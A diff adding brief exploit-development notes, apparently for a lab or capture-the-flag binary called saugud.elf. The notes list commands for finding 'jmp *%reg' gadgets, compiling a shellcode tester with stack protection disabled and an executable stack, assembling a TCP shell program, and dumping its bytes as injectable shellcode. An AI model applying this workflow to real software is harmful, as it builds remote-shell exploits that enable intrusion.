@@ -1,0 +1,17 @@
+Find JMP %reg:
+
+objdump -d ./saugud.elf | grep -E 'jmp.*?\*%' > jmps.txt
+
+Compile shell_test.c:
+
+gcc -m32 -fno-stack-protector -z execstack shell_test.c -o shell_test
+
+
+Compile shell_tcp.asm:
+
+nasm -f elf32 shell_tcp.asm
+ld -melf_i386 shell_tcp.o -o shell_tcp
+
+Make shellcode:
+
+for i in `objdump -D ./shell_tcp | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done
